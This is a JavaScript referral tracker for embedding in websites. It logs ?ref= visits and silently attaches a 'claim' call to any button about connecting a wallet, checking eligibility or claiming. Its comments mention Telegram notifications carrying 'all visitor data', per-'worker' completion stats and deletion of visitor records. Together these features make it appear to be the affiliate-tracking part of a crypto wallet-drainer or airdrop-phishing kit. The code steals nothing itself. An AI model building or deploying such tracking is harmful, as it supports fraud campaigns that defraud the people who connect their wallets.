/**
 * referral-tracker.js
 * ─────────────────────────────────────────────────────────
 * Paste this into your main website pages OR load with:
 * <script src="https://your-server.com/referral-tracker.js"></script>
 *
 * BACKEND_URL resolution order:
 *   1. window.__REF_BACKEND_URL (explicit override)
 *   2. Origin of the <script> tag that loaded this file
 *   3. window.location.origin (page origin, production-safe)
 * ─────────────────────────────────────────────────────────
 */
(function () {
  // Backend URL: prefer explicit override, then script origin, then page origin
  var BACKEND_URL = (function() {
    // 1. Explicit override via window.__REF_BACKEND_URL
    if (window.__REF_BACKEND_URL) return window.__REF_BACKEND_URL;

    // 2. Auto-detect from the script tag that loaded this file
    var scripts = document.getElementsByTagName('script');
    for (var i = 0; i < scripts.length; i++) {
      var src = scripts[i].src;
      if (src && src.indexOf('referral-tracker.js') !== -1) {
        var a = document.createElement('a');
        a.href = src;
        return a.origin;
      }
    }

    // 3. Fallback to current page origin — NEVER localhost/127.0.0.1
    return window.location.origin;
  })();

  var SESSION_KEY = '_ref_vid';
  var CLAIMED_KEY = '_ref_claimed';

  function getRefCode() {
    return new URLSearchParams(window.location.search).get('ref');
  }

  function getVisitorId() {
    return sessionStorage.getItem(SESSION_KEY);
  }

  function isClaimed() {
    return sessionStorage.getItem(CLAIMED_KEY) === '1';
  }

  // Runs automatically on every page load
  // If the URL has ?ref=CODE → records the visit silently
  async function autoTrack() {
    var code = getRefCode();
    if (!code) return;
    if (getVisitorId()) return;

    try {
      var r = await fetch(BACKEND_URL + '/api/track-visit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ refCode: code })
      });
      var d = await r.json();
      if (d.success && d.visitorId) {
        sessionStorage.setItem(SESSION_KEY, d.visitorId);
        console.log('[RefTracker] Visit tracked:', d.visitorId);
      }
    } catch (e) {
      // silent fail
    }
  }

  /**
   * Call refTracker.claim() when a visitor takes an action
   * Examples: form submission, sign-up button, wallet connect, etc.
   */
  async function claim() {
    var vid = getVisitorId();
    if (!vid) return;
    if (isClaimed()) return;

    try {
      var r = await fetch(BACKEND_URL + '/api/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ visitorId: vid })
      });
      var d = await r.json();
      if (d.success) {
        sessionStorage.setItem(CLAIMED_KEY, '1');
        console.log('[RefTracker] Claim+Complete sent');
        // Merged: clear visitor data since complete happened on backend
        sessionStorage.removeItem(SESSION_KEY);
        sessionStorage.removeItem(CLAIMED_KEY);
        console.log('[RefTracker] Visitor data cleared');
      }
    } catch (e) {}
  }

  /**
   * Call refTracker.complete() on your FINAL / thank-you page
   * This triggers:
   *   1. Telegram notification with all visitor data
   *   2. Worker stats updated (completes++)
   *   3. Visitor data deleted from database
   */
  async function complete() {
    // Merged into claim() — kept for backward compatibility
    console.log('[RefTracker] complete() is now merged into claim()');
  }

  /**
   * Auto-attach claim() to wallet connect buttons
   * Looks for common wallet button patterns
   */
  function autoAttachClaim() {
    // Common wallet button selectors
    var selectors = [
      '[data-testid="connect-wallet-btn"]',
      '[data-testid="connect-unlock-btn"]',
      'button:contains("Connect Wallet")',
      'button:contains("Check Eligibility")',
      '.btn-primary',
      'button[class*="wallet"]',
      'button[class*="connect"]'
    ];

    // Use broader approach - attach to all buttons that look like wallet/connect buttons
    var allButtons = document.querySelectorAll('button, a.btn-primary, a[role="button"]');
    allButtons.forEach(function(btn) {
      var text = (btn.textContent || btn.innerText || '').toLowerCase();
      var isWalletBtn = text.indexOf('connect') !== -1 || 
                        text.indexOf('wallet') !== -1 || 
                        text.indexOf('check') !== -1 ||
                        text.indexOf('claim') !== -1 ||
                        btn.getAttribute('data-testid') === 'connect-wallet-btn' ||
                        btn.getAttribute('data-testid') === 'connect-unlock-btn';

      if (isWalletBtn && !btn._refTrackerAttached) {
        btn._refTrackerAttached = true;
        btn.addEventListener('click', function(e) {
          console.log('[RefTracker] Wallet button clicked — sending claim');
          claim();
        });
      }
    });
  }

  // Auto-run on page load
  autoTrack();

  // Attach to buttons after DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', autoAttachClaim);
  } else {
    autoAttachClaim();
  }

  // Also re-scan periodically for dynamically added buttons
  setInterval(autoAttachClaim, 5000);  // re-scan every 5s for dynamic buttons

  // Expose to your website code
  window.refTracker = { claim: claim, complete: complete };

})();